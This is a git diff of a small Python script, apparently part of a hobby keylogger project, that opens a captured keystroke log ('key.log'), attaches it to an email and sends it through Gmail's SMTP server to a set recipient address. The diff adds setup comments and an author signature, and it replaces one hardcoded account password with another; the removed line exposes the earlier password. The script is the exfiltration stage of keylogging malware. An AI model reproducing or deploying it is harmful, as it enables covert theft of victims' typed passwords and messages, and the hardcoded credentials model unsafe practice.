@@ -4,6 +4,7 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase 
 from email import encoders 
 
+
 fromaddr = "fromk@gmail.com"#sender email address
 toaddr = "to@gmail.com"#recipient email address
 
@@ -16,7 +17,7 @@ msg['Subject'] = "keylogger"
 body = "Please find the keylogger log file in the attachment"
 msg.attach(MIMEText(body, 'plain')) 
 filename = "key.log"
-attachment = open("/home/hritik/keylogger/key.log", "rb") 
+attachment = open("/home/hritik/keylogger/key.log", "rb") #log file location in your system
 p = MIMEBase('application', 'octet-stream') 
 p.set_payload((attachment).read()) 
 encoders.encode_base64(p) 
@@ -27,10 +28,14 @@ msg.attach(p)
 # creates SMTP session 
 s = smtplib.SMTP('smtp.gmail.com', 587) 
 s.starttls() 
-s.login(fromaddr, "Github@123") #Your sender account password
+s.login(fromaddr, "password@123") #Your sender account password
 
 # Converts the Multipart msg into a string 
 text = msg.as_string() 
 s.sendmail(fromaddr, toaddr, text) 
 
 s.quit() 
+#made by hritik
+
+
+
